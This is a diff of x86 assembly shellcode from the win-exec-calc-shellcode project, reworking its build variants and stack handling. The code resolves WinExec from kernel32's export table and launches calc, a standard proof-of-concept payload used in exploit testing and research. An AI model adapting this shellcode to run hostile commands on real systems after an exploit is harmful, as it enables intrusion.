@@ -1,4 +1,4 @@
-; Copyright (c) 2009-2013, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
+; Copyright (c) 2009-2014, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
 ; and Peter Ferrie <peter.ferrie@gmail.com>
 ; Project homepage: http://code.google.com/p/win-exec-calc-shellcode/
 ; All rights reserved. See COPYRIGHT.txt for details.
@@ -14,16 +14,24 @@ SECTION .text
 %ifndef PLATFORM_INDEPENDENT
 global _shellcode                         ; _ is needed because LINKER will add it automatically.
 _shellcode:
-%ifdef STACK_ALIGN
-    AND     SP, 0xFFFC
+%ifdef FUNC
+     PUSHAD
 %endif
+%ifdef STACK_ALIGN
+%ifdef FUNC
+     MOV    EAX, ESP
+%endif
+     AND    SP, 0xFFFC
+%ifdef FUNC
+     PUSH   EAX
+%endif
+%endif
+    XOR     EDX, EDX                      ; EDX = 0
+%else
 %ifdef FUNC
     PUSHAD
 %endif
-%endif
-
-%ifndef PLATFORM_INDEPENDENT
-    XOR     EDX, EDX                      ; EDX = 0
+    INC     EDX
 %endif
     PUSH    EDX                           ; Stack = 0
     PUSH    B2DW('c', 'a', 'l', 'c')      ; Stack = "calc", 0
@@ -60,13 +68,27 @@ find_winexec_x86:
     MOV     ESI, [EDI + EBX + 0x1C]       ; ESI = [kernel32 + offset(export table) + 0x1C] = offset(address table)] = offset(address table)
     ADD     ESI, EDI                      ; ESI = kernel32 + offset(address table) = &(address table)
     ADD     EDI, [ESI + EBP * 4]          ; EDI = kernel32 + [&(address table)[WinExec ordinal]] = offset(WinExec) = &(WinExec)
-
     CALL    EDI                           ; WinExec(&("calc"), 0);
 %ifndef PLATFORM_INDEPENDENT
 %ifdef FUNC
-    POP     EAX                           ; Reset stack to where it was after pushing registers
-    POP     EAX
-    POPAD                                 ; POP registers
-    RET                                   ; Return  (in real life, you may want to replace this with "RET 0x????")
+     POP    EAX
+     POP    EAX
+%ifdef STACK_ALIGN
+     POP    ESP
 %endif
+     POPAD
+     RET
+%endif
+%elifdef FUNC
+     POP    EAX
+     POP    EAX
+     POPAD
+%ifdef STACK_ALIGN
+     POP    ESP
+%endif
+%ifdef CLEAN
+     POP    EDX
+     POP    EAX
+%endif
+     RET
 %endif
